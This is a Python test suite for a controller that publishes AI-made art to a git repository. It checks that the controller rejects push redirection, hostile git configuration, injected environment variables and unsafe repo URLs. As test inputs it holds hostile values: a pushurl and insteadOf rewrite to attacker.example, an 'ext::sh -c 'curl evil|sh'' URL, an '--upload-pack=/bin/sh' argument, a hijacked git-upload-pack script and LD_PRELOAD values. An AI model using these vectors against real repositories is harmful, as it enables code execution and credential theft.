        self.assertEqual("notification-pending", transaction["phase"])
        self.assertTrue(transaction["notification_id"].startswith("evolve-art:"))
        self.assertEqual(
            EW.OUTCOME_CONTRIBUTED,
            json.loads(EW.HISTORY_PATH.read_text())[0]["outcome"])

        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(
                cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("reconciled-contributed", second["outcome"], second)
        maker.assert_not_called()
        self.assertEqual(1, len(self.enqueued))
        self.assertEqual(
            transaction["notification_id"], self.enqueued[0]["dedupe_key"])
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_crash_immediately_after_enqueue_dedupes_on_reconciliation(self):
        def enqueue_then_crash(text, to, attachments=None, dedupe_key=None):
            self.enqueue_once(text, to, attachments, dedupe_key)
            raise KeyboardInterrupt("power cut after enqueue")

        with mock.patch.object(
                self.outbox, "enqueue", side_effect=enqueue_then_crash), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            first = EW.run_once(
                cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("interrupted", first["outcome"], first)
        self.assertEqual(1, len(self.enqueued))
        identity = self.enqueued[0]["dedupe_key"]
        self.assertTrue(identity.startswith("evolve-art:"))
        self.assertEqual(
            EW.OUTCOME_CONTRIBUTED,
            json.loads(EW.HISTORY_PATH.read_text())[0]["outcome"])

        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(
                cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("reconciled-contributed", second["outcome"], second)
        maker.assert_not_called()
        self.assertEqual(1, len(self.enqueued), "stable identity must dedupe")
        self.assertGreaterEqual(self.enqueue_attempts.count(identity), 2)
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_nothing_is_enqueued_when_the_merge_is_not_verified(self):
        phases = {"start": healthy(), "pre-write": healthy(),
                  "pre-merge": critical("rb_workflows")}
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg,
                                  health=lambda phase: phases[phase])
        self.assertEqual(EW.OUTCOME_ABORTED, summary["outcome"])
        self.assertEqual(1, len(self.enqueued), "the abort is reported…")
        self.assertNotIn("Public Art Collective:", self.enqueued[0]["text"],
                         "…but not as art")
        self.assertNotIn(EW.SUCCESS_PREFIX, self.enqueued[0]["text"])

    def test_the_worker_never_claims_delivery_it_cannot_verify(self):
        # A queue that cannot be drained must not turn a merge into a failure,
        # and must not turn a failed send into a success either: the merge is
        # recorded, the message is queued, and alert_delivery is what tells a
        # human the channel is broken.
        self.outbox.drain.side_effect = RuntimeError("Messages is not running")
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"])
        self.assertEqual(1, len(self.enqueued))
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, row["outcome"])
        self.assertIn("merge_commit", row)

    def test_unverified_delivery_blocks_the_next_cycle(self):
        # outbox.status() reports unverified/dead-letter counts (232ce7e);
        # checks.py turns those into a failing alert_delivery, and this worker
        # refuses to make more art until a human has been reachable again.
        degraded = {"status": "degraded", "critical": [],
                    "failed": ["alert_delivery"], "checks": [], "summary": "x"}
        cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "degraded_allowlist": ["alert_delivery", "w_openrappter_spin"]})
        with mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=cfg, health=lambda phase: degraded)
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("alert_delivery", summary["reason"])
        maker.assert_not_called()
        self.assertEqual([], self.enqueued)


class ForgedFinalistTests(WorkerEnv):
    """Same id, different content, must not pass (#2)."""

    def setUp(self):
        super().setUp()
        self.cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin), "git_author_name": "test",
            "git_author_email": "t@example.com",
            "fanout": {"enabled": True, "children": 3}})
        self.results = [child_result("a"), child_result("b"),
                        child_result("adversarial-verifier", wave=2)]

    def run_with(self, forge):
        with mock.patch.object(EW.SS, "run_children", return_value=self.results), \
             mock.patch.object(EW, "run_model",
                               FanoutIntegrationTests.maker_using_finalists(
                                   self, forge=forge)):
            return EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

    def test_a_rewritten_premise_under_the_same_id_is_rejected(self):
        summary = self.run_with({"premise": "something else entirely"})
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("content was rewritten", summary["detail"])
        self.assertFalse(self.gh.calls, "nothing reaches GitHub")

    def test_a_rewritten_score_is_rejected(self):
        summary = self.run_with({"scores": {d: 10 for d in EW.SCORE_DIMENSIONS}})
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("content was rewritten", summary["detail"])

    def test_rewritten_role_provenance_is_rejected(self):
        summary = self.run_with({"from": "someone-more-impressive"})
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])

    def test_a_rewritten_evidence_digest_is_rejected(self):
        summary = self.run_with({"evidence_digest": "0" * 64})
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])

    def test_dropping_a_record_field_is_rejected(self):
        def maker(staging, prompt, wcfg, depth=0, runtime=None):
            staging = Path(staging)
            records = json.loads((staging / "round1.json").read_text())
            stripped = [{"id": r["id"], "premise": r["premise"],
                         "scores": r["scores"]} for r in records]
            write_submission(staging / "out", "new-piece",
                             meta_for("new-piece", round1_records=stripped))
            (staging / "state-out.json").write_text(json.dumps(
                {"cycle": 1, "last_slug": "new-piece", "notes": "n"}),
                encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        with mock.patch.object(EW.SS, "run_children", return_value=self.results), \
             mock.patch.object(EW, "run_model", maker):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("must carry the finalist record", summary["detail"])

    def test_a_published_digest_that_lies_about_its_own_fields_is_rejected(self):
        summary = self.run_with({"digest": "f" * 64})
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("publishes a digest", summary["detail"])


class CloneScopeTests(WorkerEnv):
    """The controller's own clone: what it copies in, and what it pushes."""

    def setUp(self):
        super().setUp()
        self.clone = self.home / "clone"
        subprocess.run(["git", "clone", str(self.origin), str(self.clone)],
                       check=True, capture_output=True)
        self.wcfg = EW.worker_config({"evolve_worker": {"repo": str(self.origin)}})
        self.wcfg["repo"] = str(self.origin)
        staging_out = self.home / "stage" / "out"
        staging_out.mkdir(parents=True)
        write_submission(staging_out, "new-piece", meta_for("new-piece"))
        self.submission = EW.gate_directory(staging_out, self.wcfg, 1, None,
                                            None, {"already-here"})

    def test_the_controller_copies_only_the_validated_bytes(self):
        EW.install_into_clone(self.clone, self.submission)
        paths = EW.verify_clone_scope(self.clone, self.submission, self.wcfg)
        self.assertEqual(["submissions/new-piece/meta.json",
                          "submissions/new-piece/piece.svg"], paths)
        mode = (self.clone / "submissions" / "new-piece" / "piece.svg").stat().st_mode
        self.assertEqual(0o644, mode & 0o777, "copies are never executable")

    def test_an_extra_file_appearing_in_the_clone_is_caught(self):
        EW.install_into_clone(self.clone, self.submission)
        (self.clone / "submissions" / "new-piece" / "sneaky.txt").write_text(
            "x", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            EW.verify_clone_scope(self.clone, self.submission, self.wcfg)
        self.assertIn("expected", str(cm.exception))

    def test_an_edited_existing_file_in_the_clone_is_caught(self):
        EW.install_into_clone(self.clone, self.submission)
        (self.clone / "submissions" / "index.json").write_text("[]", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            EW.verify_clone_scope(self.clone, self.submission, self.wcfg)
        self.assertIn("existing path", str(cm.exception))

    def test_a_moved_head_in_the_clone_is_caught(self):
        base = git(self.clone, "rev-parse", "HEAD").strip()
        EW.install_into_clone(self.clone, self.submission)
        git(self.clone, "config", "user.email", "t@example.com")
        git(self.clone, "config", "user.name", "t")
        git(self.clone, "add", "-A")
        git(self.clone, "commit", "-m", "not the controller")
        with self.assertRaises(EW.GateError) as cm:
            EW.verify_clone_scope(self.clone, self.submission, self.wcfg, base)
        self.assertIn("moved its HEAD", str(cm.exception))

    def test_installing_over_an_existing_slug_is_refused(self):
        EW.install_into_clone(self.clone, self.submission)
        with self.assertRaises(EW.GateError):
            EW.install_into_clone(self.clone, self.submission)

    # ── the push-redirect repro ──
    def test_a_pushurl_is_rejected_before_anything_is_pushed(self):
        attacker = self.home / "attacker.git"
        subprocess.run(["git", "init", "--bare", "-b", "main", str(attacker)],
                       check=True, capture_output=True)
        git(self.clone, "config", "remote.origin.pushurl", str(attacker))

        with self.assertRaises(EW.GateError) as cm:
            EW.assert_repo_integrity(self.clone, self.wcfg)
        self.assertIn("pushurl", str(cm.exception))
        self.assertIn(str(self.origin), str(cm.exception))

        refs = git_bare(attacker, "for-each-ref", "--format=%(refname)")
        self.assertEqual("", refs.strip(), "nothing reached the attacker remote")

    def test_a_wandering_fetch_url_is_reset_to_canonical(self):
        git(self.clone, "remote", "set-url", "origin",
            "https://example.invalid/somewhere-else.git")
        self.assertEqual(str(self.origin),
                         EW.assert_repo_integrity(self.clone, self.wcfg))
        self.assertEqual(str(self.origin),
                         git(self.clone, "remote", "get-url", "origin").strip())
        self.assertEqual(str(self.origin),
                         git(self.clone, "remote", "get-url", "--push",
                             "origin").strip())

    def test_a_forged_staging_file_cannot_redirect_a_push(self):
        """The repro from the finding, end to end.

        A maker that writes something shaped like git configuration into its
        staging area cannot affect the push at all: the file is rejected by
        the gate, and even if it somehow reached the clone, the integrity
        check resets the remote before the push.
        """
        staging = self.home / "stage2"
        EW.prepare_staging(staging)
        out = staging / "out"
        write_submission(out, "second-piece", meta_for("second-piece"))
        forged = out / EW.SUBMISSION_DIR / ".git"
        forged.mkdir()
        (forged / "config").write_text(
            "[remote \"origin\"]\n\tpushurl = https://attacker.example/x.git\n",
            encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            EW.assert_no_git(staging)
        self.assertIn(".git", str(cm.exception))

        # and the second lock: a clone whose config was tampered with never
        # gets to the push at all
        git(self.clone, "config", "remote.origin.pushurl",
            "https://attacker.example/x.git")
        with self.assertRaises(EW.GateError) as cm2:
            EW.assert_repo_integrity(self.clone, self.wcfg)
        self.assertIn("pushurl", str(cm2.exception))

    def test_unexpected_local_config_is_rejected(self):
        for key, value in (("core.hooksPath", "/tmp/hooks"),
                           ("core.sshCommand", "ssh -o x=y"),
                           ("url.https://attacker.example/.insteadOf",
                            "https://github.com/"),
                           ("credential.helper", "!evil")):
            with self.subTest(key=key):
                git(self.clone, "config", key, value)
                with self.assertRaises(EW.GateError) as cm:
                    EW.assert_repo_integrity(self.clone, self.wcfg)
                self.assertIn(key.split(".")[0], str(cm.exception).lower())
                subprocess.run(["git", "config", "--unset-all", key],
                               cwd=str(self.clone), capture_output=True)

    def test_an_alternates_file_is_rejected(self):
        alt = self.clone / ".git" / "objects" / "info"
        alt.mkdir(parents=True, exist_ok=True)
        (alt / "alternates").write_text("/somewhere/else/objects\n",
                                        encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            EW.assert_repo_integrity(self.clone, self.wcfg)
        self.assertIn("alternates", str(cm.exception))

    def test_an_executable_hook_is_rejected(self):
        hooks = self.clone / ".git" / "hooks"
        hooks.mkdir(exist_ok=True)
        hook = hooks / "pre-push"
        hook.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        hook.chmod(0o755)
        with self.assertRaises(EW.GateError) as cm:
            EW.assert_repo_integrity(self.clone, self.wcfg)
        self.assertIn("hooks", str(cm.exception))

    def test_a_clean_clone_passes_and_returns_the_canonical_url(self):
        self.assertEqual(str(self.origin),
                         EW.assert_repo_integrity(self.clone, self.wcfg))

    # ── the index, verified before the push ──
    def test_the_staged_index_is_verified_against_the_gated_bytes(self):
        EW.install_into_clone(self.clone, self.submission)
        git(self.clone, "add", "--", "submissions/new-piece")
        paths = sorted([self.submission["meta_path"], self.submission["piece_path"]])
        EW.verify_staged_tree(self.clone, self.submission, self.wcfg, paths)

        proc = subprocess.run(["git", "hash-object", "-w", "--stdin"],
                              cwd=str(self.clone), input=b"forged bytes",
                              capture_output=True)
        blob = proc.stdout.decode().strip()
        subprocess.run(["git", "update-index", "--cacheinfo",
                        f"100644,{blob},submissions/new-piece/piece.svg"],
                       cwd=str(self.clone), check=True, capture_output=True)
        with self.assertRaises(EW.GateError) as cm:
            EW.verify_staged_tree(self.clone, self.submission, self.wcfg, paths)
        self.assertIn("not the file that passed the gate", str(cm.exception))

    def test_a_symlink_mode_in_the_index_is_rejected(self):
        EW.install_into_clone(self.clone, self.submission)
        git(self.clone, "add", "--", "submissions/new-piece")
        paths = sorted([self.submission["meta_path"], self.submission["piece_path"]])
        proc = subprocess.run(["git", "hash-object", "-w", "--stdin"],
                              cwd=str(self.clone), input=b"/etc/passwd",
                              capture_output=True)
        blob = proc.stdout.decode().strip()
        subprocess.run(["git", "update-index", "--cacheinfo",
                        f"120000,{blob},submissions/new-piece/piece.svg"],
                       cwd=str(self.clone), check=True, capture_output=True)
        with self.assertRaises(EW.GateError) as cm:
            EW.verify_staged_tree(self.clone, self.submission, self.wcfg, paths)
        self.assertIn("120000", str(cm.exception))


class CleanupIntegrityTests(WorkerEnv):
    """Cleanup is exactly when the repository is least trustworthy."""

    def setUp(self):
        super().setUp()
        self.attacker = self.home / "attacker.git"
        subprocess.run(["git", "init", "--bare", "-b", "main",
                        str(self.attacker)], check=True, capture_output=True)

    def attacker_refs(self):
        return git_bare(self.attacker, "for-each-ref",
                        "--format=%(refname)").split()

    def origin_branches(self):
        return [r for r in git_bare(self.origin, "for-each-ref",
                                    "--format=%(refname)").split()
                if r != "refs/heads/main"]

    def gh_that_fails_pr_create_after_injecting_a_pushurl(self, clone_holder):
        """The repro: the push succeeds, then a pushurl appears, then PR
        creation fails and the cleanup path runs."""
        def fake(*args, timeout=None, **kw):
            self.gh.calls.append(args)
            if args[:2] == ("pr", "create"):
                clone = clone_holder.get("clone")
                git(clone, "config", "remote.origin.pushurl", str(self.attacker))
                raise EW.CommandError("gh pr create exited 1: rate limited")
            raise AssertionError(f"unexpected gh call: {args}")
        return fake

    def test_cleanup_never_pushes_to_an_injected_remote(self):
        holder = {}
        real_publish = EW.publish

        def capture(clone, *a, **kw):
            holder["clone"] = clone
            return real_publish(clone, *a, **kw)

        with mock.patch.object(EW, "publish", capture), \
             mock.patch.object(EW, "_gh",
                               self.gh_that_fails_pr_create_after_injecting_a_pushurl(holder)), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_FAILED, summary["outcome"], summary)
        self.assertEqual([], self.attacker_refs(),
                         "the cleanup pushed to the attacker's remote")
        self.assertEqual([], self.origin_branches(),
                         "the real branch was left orphaned on origin")

    def test_a_tampered_clone_still_cleans_the_real_origin(self):
        # The unit of the same guarantee: a clone whose config was rewritten
        # cannot be used, and the branch is still removed from the real repo.
        clone = self.home / "clone"
        subprocess.run(["git", "clone", str(self.origin), str(clone)],
                       check=True, capture_output=True)
        git(clone, "config", "user.email", "t@example.com")
        git(clone, "config", "user.name", "t")
        git(clone, "checkout", "-q", "-b", "art/doomed")
        (clone / "x.txt").write_text("x", encoding="utf-8")
        git(clone, "add", "-A")
        git(clone, "commit", "-qm", "doomed")
        git(clone, "push", "-q", "-u", "origin", "art/doomed")
        self.assertEqual(["refs/heads/art/doomed"], self.origin_branches())

        git(clone, "config", "remote.origin.pushurl", str(self.attacker))
        wcfg = dict(EW.worker_config({}), repo=str(self.origin))
        self.assertTrue(EW._delete_remote_branch(clone, "art/doomed", wcfg))

        self.assertEqual([], self.origin_branches(),
                         "the real branch should have been deleted")
        self.assertEqual([], self.attacker_refs(),
                         "nothing may reach the injected remote")

    def test_an_unreachable_canonical_repo_fails_closed(self):
        clone = self.home / "clone2"
        subprocess.run(["git", "clone", str(self.origin), str(clone)],
                       check=True, capture_output=True)
        git(clone, "config", "remote.origin.pushurl", str(self.attacker))
        wcfg = dict(EW.worker_config({}),
                    repo=str(self.home / "does-not-exist.git"))
        self.assertFalse(EW._delete_remote_branch(clone, "art/nope", wcfg))
        self.assertEqual([], self.attacker_refs())

    def test_the_network_chokepoint_refuses_a_tampered_clone(self):
        clone = self.home / "clone3"
        subprocess.run(["git", "clone", str(self.origin), str(clone)],
                       check=True, capture_output=True)
        git(clone, "config", "remote.origin.pushurl", str(self.attacker))
        wcfg = dict(EW.worker_config({}), repo=str(self.origin))
        with self.assertRaises(EW.GateError):
            EW._git_remote(clone, wcfg, "fetch", "--no-tags", "origin", "main")

    def test_the_chokepoint_rejects_local_verbs(self):
        clone = self.home / "clone4"
        subprocess.run(["git", "clone", str(self.origin), str(clone)],
                       check=True, capture_output=True)
        wcfg = dict(EW.worker_config({}), repo=str(self.origin))
        with self.assertRaises(EW.CommandError):
            EW._git_remote(clone, wcfg, "status", "--porcelain")

    def test_no_unaudited_network_git_call_survives_in_the_source(self):
        """The invariant, asserted against the code rather than remembered.

        Every git verb that can reach the network must go through
        `_git_remote()` (which verifies repo integrity first) — or sit on a
        line explicitly marked `sanctioned-network-git`, with a reason. The
        count of sanctioned exceptions is pinned so a new one cannot arrive
        quietly.
        """
        source = (Path(__file__).resolve().parent / "evolve_worker.py").read_text(
            encoding="utf-8")
        lines = source.splitlines()
        verbs = ("fetch", "push", "pull", "ls-remote", "clone", "submodule",
                 "archive")
        offenders, sanctioned = [], 0
        for n, line in enumerate(lines):
            match = re.search(r'_git\((?!_)[^)]*?"(' + "|".join(verbs) + r')"', line)
            if not match:
                continue
            window = "\n".join(lines[max(0, n - 6):n + 1])
            if "sanctioned-network-git" in window:
                sanctioned += 1
            else:
                offenders.append(f"{n + 1}: {line.strip()[:90]}")
        self.assertEqual([], offenders,
                         "network git must go through _git_remote(), or carry "
                         "a sanctioned-network-git justification")
        self.assertEqual(2, sanctioned,
                         "the sanctioned exceptions are the two calls in the "
                         "sanitized cleanup repo; a new one needs review")

    def test_the_controller_never_shells_out_to_git_clone(self):
        source = (Path(__file__).resolve().parent / "evolve_worker.py").read_text(
            encoding="utf-8")
        body = source.split("def _clone_repo", 1)[1].split("\ndef ", 1)[0]
        self.assertNotIn('"clone"', body,
                         "the clone is built by init + fetch, never by "
                         "`git clone`, which reads global config before it "
                         "resolves the url")

    def test_every_raw_git_subprocess_lives_in_an_isolated_helper(self):
        """Only these functions may hand a git/gh command to the OS, and they
        are the ones that pin the binary and set the sanitized environment."""
        import ast
        path = Path(__file__).resolve().parent / "evolve_worker.py"
        tree = ast.parse(path.read_text(encoding="utf-8"))
        allowed = {"_git", "_git_bytes", "_gh", "assert_publish_auth"}
        found = {}

        def argv0_is_a_binary(call):
            if not (isinstance(call.func, ast.Attribute)
                    and call.func.attr == "run"
                    and getattr(call.func.value, "id", "") == "subprocess"
                    and call.args and isinstance(call.args[0], ast.List)
                    and call.args[0].elts):
                return False
            first = call.args[0].elts[0]
            if isinstance(first, ast.Constant) and first.value in ("git", "gh"):
                return True
            if (isinstance(first, ast.Call)
                    and getattr(first.func, "id", "") in ("git_binary",
                                                          "gh_binary")):
                return True
            # the pinned binary now arrives on the controller context
            return (isinstance(first, ast.Attribute)
                    and first.attr in ("git_path", "gh_path"))

        for node in ast.walk(tree):
            if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            for inner in ast.walk(node):
                if isinstance(inner, ast.Call) and argv0_is_a_binary(inner):
                    found[node.name] = found.get(node.name, 0) + 1
        self.assertEqual(allowed, set(found),
                         f"git/gh subprocess calls appeared outside the pinned "
                         f"helpers: {sorted(set(found) - allowed)}")


class CloneIsolationTests(WorkerEnv):
    """The clone itself is a controller-owned, config-isolated operation."""

    def setUp(self):
        super().setUp()
        # A second repo with a DIFFERENT marker file, standing in for the
        # attacker's. If a rewrite ever wins, the marker says so instantly.
        self.attacker = self.home / "attacker.git"
        seed = self.home / "attacker-seed"
        seed.mkdir()
        git(seed, "init", "-q", "-b", "main")
        git(seed, "config", "user.email", "a@example.com")
        git(seed, "config", "user.name", "a")
        (seed / "MARKER").write_text("ATTACKER", encoding="utf-8")
        write_submission(seed, "attacker-piece", meta_for("attacker-piece"))
        git(seed, "add", "-A")
        git(seed, "commit", "-qm", "attacker seed")
        git(self.home, "init", "--bare", "-q", "-b", "main", str(self.attacker))
        git(seed, "remote", "add", "origin", str(self.attacker))
        git(seed, "push", "-q", "origin", "main")

        # …and a marker on the canonical side, so "we got the right one" is
        # a positive assertion rather than the absence of a bad one.
        canonical_seed = self.home / "canonical-seed"
        subprocess.run(["git", "clone", "-q", str(self.origin),
                        str(canonical_seed)], check=True, capture_output=True)
        git(canonical_seed, "config", "user.email", "t@example.com")
        git(canonical_seed, "config", "user.name", "t")
        (canonical_seed / "MARKER").write_text("CANONICAL", encoding="utf-8")
        git(canonical_seed, "add", "-A")
        git(canonical_seed, "commit", "-qm", "canonical marker")
        git(canonical_seed, "push", "-q", "origin", "main")
        self.canonical_head = git_bare(self.origin, "rev-parse", "main").strip()

        self.gitconfig = self.home / "hostile.gitconfig"
        self.gitconfig.write_text(
            f'[url "{self.attacker}"]\n\tinsteadOf = {self.origin}\n',
            encoding="utf-8")
        self.wcfg = dict(EW.worker_config({}), repo=str(self.origin))

    def test_a_global_insteadof_rewrite_cannot_redirect_the_clone(self):
        clone = self.home / "clone"
        # Prove the hostile config WOULD win against a naive clone…
        naive = subprocess.run(
            ["git", "clone", "-q", str(self.origin), str(self.home / "naive")],
            capture_output=True, text=True,
            env={**os.environ, "GIT_CONFIG_GLOBAL": str(self.gitconfig)})
        self.assertEqual(0, naive.returncode, naive.stderr[:300])
        self.assertEqual("ATTACKER",
                         (self.home / "naive" / "MARKER").read_text().strip(),
                         "the repro itself is broken if this is not the "
                         "attacker's content")

        # …and that the controller's clone is immune to it.
        with mock.patch.dict(os.environ,
                             {"GIT_CONFIG_GLOBAL": str(self.gitconfig)}), \
             mock.patch.object(EW, "_CTX_CACHE", {}):
            head = EW._clone_repo(self.wcfg, clone)

        self.assertEqual("CANONICAL", (clone / "MARKER").read_text().strip(),
                         "the controller cloned the attacker's repository")
        self.assertEqual(self.canonical_head, head)
        self.assertFalse((clone / "submissions" / "attacker-piece").exists())
        self.assertEqual(str(self.origin),
                         git(clone, "remote", "get-url", "origin").strip())

    def test_config_injected_through_the_environment_is_stripped(self):
        clone = self.home / "clone-env"
        hostile = {
            "GIT_CONFIG_COUNT": "1",
            "GIT_CONFIG_KEY_0": f"url.{self.attacker}.insteadOf",
            "GIT_CONFIG_VALUE_0": str(self.origin),
        }
        with mock.patch.dict(os.environ, hostile), \
             mock.patch.object(EW, "_CTX_CACHE", {}):
            EW._clone_repo(self.wcfg, clone)
        self.assertEqual("CANONICAL", (clone / "MARKER").read_text().strip())

    def test_the_sanitized_environment_has_no_rewrites_or_proxies(self):
        with mock.patch.dict(os.environ, {"https_proxy": "http://evil:8080",
                                          "GIT_SSH_COMMAND": "ssh -o x=y",
                                          "GIT_CONFIG_PARAMETERS": "'a.b=c'"}), \
             mock.patch.object(EW, "_CTX_CACHE", {}):
            env = EW.controller_git_env()
        for leaked in ("https_proxy", "GIT_SSH_COMMAND", "GIT_CONFIG_PARAMETERS",
                       "GIT_CONFIG_COUNT", "GIT_PROXY_COMMAND"):
            self.assertNotIn(leaked, env)
        self.assertEqual(os.devnull, env["GIT_CONFIG_SYSTEM"])
        self.assertEqual("1", env["GIT_CONFIG_NOSYSTEM"])
        self.assertEqual("0", env["GIT_TERMINAL_PROMPT"])
        self.assertEqual("https:file", env["GIT_ALLOW_PROTOCOL"])
        config = Path(env["GIT_CONFIG_GLOBAL"]).read_text(encoding="utf-8")
        directives = [line for line in config.splitlines()
                      if line.strip() and not line.lstrip().startswith("#")]
        self.assertTrue(all(d.startswith(('[credential "https://github.com"]',
                                          "\thelper"))
                            for d in directives),
                        f"the sanitized config holds more than a helper: "
                        f"{directives}")

    def test_the_helper_is_generated_from_the_pinned_gh(self):
        # nothing is inherited any more: the helper is a file this code
        # writes, naming the validated gh binary and one fixed subcommand
        helper = EW.credential_helper_path(None, self.home / "githome")
        body = helper.read_text()
        self.assertIn(EW.gh_binary(), body)
        self.assertIn("auth git-credential", body)
        self.assertNotIn("credential.helper", body)

    # ── url shapes ──
    def test_hostile_repo_urls_are_refused_before_git_sees_them(self):
        for repo in ("ext::sh -c 'curl evil|sh'",
                     "--upload-pack=/bin/sh",
                     "https://user:token@github.com/kody-w/x",
                     "https://evil.example/kody-w/x",
                     "git://github.com/kody-w/x",
                     "http://github.com/kody-w/x",
                     "ssh://git@github.com/kody-w/x",
                     "https://github.com/too/many/parts",
                     "../evil",
                     "-u./payload"):
            with self.subTest(repo=repo):
                with self.assertRaises(EW.GateError):
                    EW.validate_repo_url(repo, self.wcfg)

    def test_the_canonical_shapes_are_accepted(self):
        self.assertEqual("https://github.com/kody-w/public-art-collective.git",
                         EW.validate_repo_url("kody-w/public-art-collective",
                                              self.wcfg))
        self.assertEqual(str(self.origin),
                         EW.validate_repo_url(str(self.origin), self.wcfg),
                         "explicit local paths stay allowed for temp repos")

    def test_a_missing_local_repo_is_refused(self):
        with self.assertRaises(EW.GateError):
            EW.validate_repo_url(str(self.home / "nope.git"), self.wcfg)

    def test_an_extra_allowed_host_can_be_configured(self):
        wcfg = dict(self.wcfg, allowed_repo_hosts=["github.example.com"])
        self.assertEqual("https://github.example.com/a/b",
                         EW.validate_repo_url("https://github.example.com/a/b",
                                              wcfg))
        with self.assertRaises(EW.GateError):
            EW.validate_repo_url("https://github.com/a/b", wcfg)


HOSTILE_GIT_ENV_VARS = (
    # execution paths — the finding: GIT_EXEC_PATH decides where
    # git-remote-https and git-upload-pack come from
    "GIT_EXEC_PATH", "GIT_TEMPLATE_DIR", "GIT_SSH", "GIT_SSH_COMMAND",
    "GIT_PROXY_COMMAND", "GIT_EXTERNAL_DIFF", "GIT_ASKPASS", "GIT_EDITOR",
    "GIT_PAGER", "GIT_SEQUENCE_EDITOR",
    # dynamic linker injection
    "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH", "DYLD_FRAMEWORK_PATH",
    # config injection
    "GIT_CONFIG_PARAMETERS", "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0",
    "GIT_CONFIG_VALUE_0", "GIT_CONFIG", "GIT_ATTR_NOSYSTEM",
    # repository redirection
    "GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE", "GIT_NAMESPACE",
    "GIT_OBJECT_DIRECTORY", "GIT_ALTERNATE_OBJECT_DIRECTORIES",
    "GIT_CEILING_DIRECTORIES",
    # transport and proxying
    "GIT_ALLOW_PROTOCOL", "GIT_PROTOCOL_FROM_USER", "GIT_SMART_HTTP",
    "http_proxy", "https_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY",
    "all_proxy", "NO_PROXY",
    # prompting and tracing
    "GIT_TERMINAL_PROMPT", "GIT_TRACE", "GIT_TRACE2", "GIT_CURL_VERBOSE",
    # identity and location
    "XDG_CONFIG_HOME", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
)


class HostileEnvironmentTests(WorkerEnv):
    """Nothing ambient reaches git unless the controller put it there (#1).

    The vector this closes was reproduced first: a fake `git-upload-pack` on
    GIT_EXEC_PATH executes during a plain local clone, before any config is
    read and long before repo integrity is checked. A denylist that misses one
    variable misses the transport itself, so the environment is an allowlist.
    """

    def setUp(self):
        super().setUp()
        self.wcfg = dict(EW.worker_config({}), repo=str(self.origin))
        self.marker = self.home / "PWNED"
        self.exec_path = self.home / "hostile-exec"
        self.exec_path.mkdir()
        hijack = self.exec_path / "git-upload-pack"
        hijack.write_text(
            f'#!/bin/sh\ntouch "{self.marker}"\n'
            f'exec /usr/bin/git-upload-pack "$@"\n', encoding="utf-8")
        hijack.chmod(0o755)
        self.hostile = {v: self.hostile_value(v) for v in HOSTILE_GIT_ENV_VARS}

    def hostile_value(self, name):
        if name == "GIT_EXEC_PATH":
            return str(self.exec_path)
        if name in ("GIT_CONFIG_COUNT",):
            return "1"
        if name == "GIT_CONFIG_KEY_0":
            return "url.https://attacker.example/.insteadOf"
        if name == "GIT_CONFIG_VALUE_0":
            return "https://github.com/"
        if name == "GIT_TERMINAL_PROMPT":
            return "1"
        if name == "GIT_ALLOW_PROTOCOL":
            return "ext"
        if name in ("LD_PRELOAD", "DYLD_INSERT_LIBRARIES"):
            return "/tmp/evil.dylib"
        return f"/hostile/{name.lower()}"

    def fresh_env(self):
        with mock.patch.object(EW, "_CTX_CACHE", {}):
            return EW.controller_git_env()

    # ── the allowlist itself ──
    def test_no_hostile_variable_survives_unless_the_controller_set_it(self):
        controller_set = {"GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
                          "GIT_CONFIG_NOSYSTEM", "GIT_TERMINAL_PROMPT",
                          "GIT_ASKPASS", "GIT_ALLOW_PROTOCOL",
                          "GIT_PROTOCOL_FROM_USER", "XDG_CONFIG_HOME"}
        with mock.patch.dict(os.environ, self.hostile):
            env = self.fresh_env()
        for name in HOSTILE_GIT_ENV_VARS:
            with self.subTest(var=name):
                if name in controller_set:
                    self.assertNotEqual(self.hostile[name], env.get(name),
                                        f"{name} kept its hostile value")
                else:
                    self.assertNotIn(name, env, f"{name} survived the allowlist")

    def test_the_environment_is_exactly_what_the_controller_decided(self):
        with mock.patch.dict(os.environ, self.hostile):
